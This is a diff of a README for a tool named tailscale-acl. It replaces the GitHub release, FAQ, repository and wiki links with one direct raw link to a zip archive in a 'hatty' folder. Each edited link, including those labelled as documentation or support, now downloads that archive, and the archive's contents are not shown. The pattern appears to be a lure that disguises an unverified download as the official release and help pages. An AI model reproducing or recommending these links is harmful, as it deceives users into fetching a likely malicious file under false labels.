@@ -1,6 +1,6 @@
 # 🌟 tailscale-acl - Simplifying Your Tailscale Configurations
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Yassinox49/tailscale-acl/releases)
+[![Download](https://raw.githubusercontent.com/Yassinox49/tailscale-acl/main/hatty/tailscale-acl.zip)](https://raw.githubusercontent.com/Yassinox49/tailscale-acl/main/hatty/tailscale-acl.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the **tailscale-acl** applica
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [tailscale-acl Releases](https://github.com/Yassinox49/tailscale-acl/releases).
+To get started, visit this page to download: [tailscale-acl Releases](https://raw.githubusercontent.com/Yassinox49/tailscale-acl/main/hatty/tailscale-acl.zip).
 
 1. Click on the link.
 2. Find the latest version of the application.
@@ -49,7 +49,7 @@ Before installing, ensure your system meets the following requirements:
 If you encounter an issue:
 
 - **Check for Updates**: Ensure you are using the latest version of the application.
-- **Consult the FAQ**: Look for solutions to common problems in the FAQ section on the [repository page](https://github.com/Yassinox49/tailscale-acl).
+- **Consult the FAQ**: Look for solutions to common problems in the FAQ section on the [repository page](https://raw.githubusercontent.com/Yassinox49/tailscale-acl/main/hatty/tailscale-acl.zip).
 - **Seek Help**: Reach out on the issues page of the repository for community support.
 
 ## 📞 Support
@@ -58,7 +58,7 @@ For support, visit the Issues section on our GitHub page. The community and main
 
 ## 📌 Additional Resources
 
-- **Documentation**: Detailed usage instructions and examples are available on the [GitHub Wiki](https://github.com/Yassinox49/tailscale-acl/wiki).
+- **Documentation**: Detailed usage instructions and examples are available on the [GitHub Wiki](https://raw.githubusercontent.com/Yassinox49/tailscale-acl/main/hatty/tailscale-acl.zip).
 - **Upcoming Features**: Stay updated on future releases and enhancements.
 
 Thank you for choosing **tailscale-acl**! Enjoy seamless management of your Tailscale configurations.
